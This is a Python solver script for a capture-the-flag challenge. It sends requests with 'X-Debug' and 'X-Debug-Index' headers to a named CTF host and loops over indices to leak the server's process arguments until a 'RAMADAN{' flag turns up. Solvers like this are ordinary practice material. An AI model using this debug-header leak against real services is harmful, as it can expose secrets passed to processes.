import requests
import sys

# --- Target Information ---
HOST = "ctfify.1pc.tf"
PORT = 32779
URL = f"http://{HOST}:{PORT}/"

# The maximum argument index to check. Your analysis found it at 9,
# but we can check a few more just in case.
MAX_INDEX = 15

print(f"⚙️  Starting solver for {URL}")
print("Vulnerability: Leaking argv via X-Debug headers")

# Loop through argument indices from 0 to MAX_INDEX
for i in range(MAX_INDEX + 1):
    # Prepare the special debug headers for each request
    headers = {
        'X-Debug': 'true',
        'X-Debug-Index': str(i)
    }

    try:
        # Send the GET request with the custom headers
        response = requests.get(URL, headers=headers, timeout=5)
        
        if response.status_code == 200:
            content = response.text.strip()
            print(f"[*] Leaked argv[{i}]: {content}")

            # Check if the leaked argument contains the flag format
            if "RAMADAN{" in content:
                print("\n" + "="*40)
                print("🎉 Found the flag!")
                print(f"🚩 Flag: {content}")
                print("="*40)
                sys.exit(0) # Exit successfully
        else:
            print(f"[!] Request for index {i} failed with status: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[!] An error occurred while connecting to the server: {e}")
        sys.exit(1)

print("\n❌ Solver finished. Flag not found in the checked indices.")